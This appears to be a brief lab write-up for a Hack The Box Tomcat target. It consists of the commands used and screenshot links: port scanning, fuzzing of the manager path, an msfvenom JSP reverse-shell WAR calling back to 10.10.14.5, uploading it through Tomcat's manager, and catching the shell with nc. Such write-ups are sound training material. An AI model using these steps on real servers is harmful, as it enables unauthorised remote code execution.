```
nmap -p- -T5 10.10.10.95
http://10.10.10.95:8080/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.95:8080/manager/html
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
nc -nlvp 80
http://10.10.10.95:8080/revshell/
```


```
nmap -p- -T5 10.10.10.95
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4576f5f1-7eb0-4800-894b-a92608287032)


```
http://10.10.10.95:8080/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6ec6aea8-028c-4ab0-b49b-0fc4118351ce)


```
http://10.10.10.95:8080/manager/html
```
![image](https://github.com/regarmulia/HTB/assets/33616880/57dac7fa-90ad-49e5-a986-c066fee11282)



```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1bd86ea5-18df-40be-9281-2a8514ab3c7c)
![image](https://github.com/regarmulia/HTB/assets/33616880/b59b82fd-16cf-44f1-89da-0cbfd394b4e0)


```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0ff1889d-e8a5-4a33-b6ea-6a471eb18edc)


```
Upload shell
http://10.10.10.95:8080/manager/html
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d42e6ba7-54c0-4c82-b94e-b89f3bb38eb8)
![image](https://github.com/regarmulia/HTB/assets/33616880/9c29c581-2444-416b-9892-1607da41cca5)


```
nc -nlvp 80
http://10.10.10.95:8080/revshell/
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0ea335c6-ad65-440b-b3fd-6ab22aee021c)
![image](https://github.com/regarmulia/HTB/assets/33616880/e4069ded-888b-472d-b18d-298a77cc78ce)





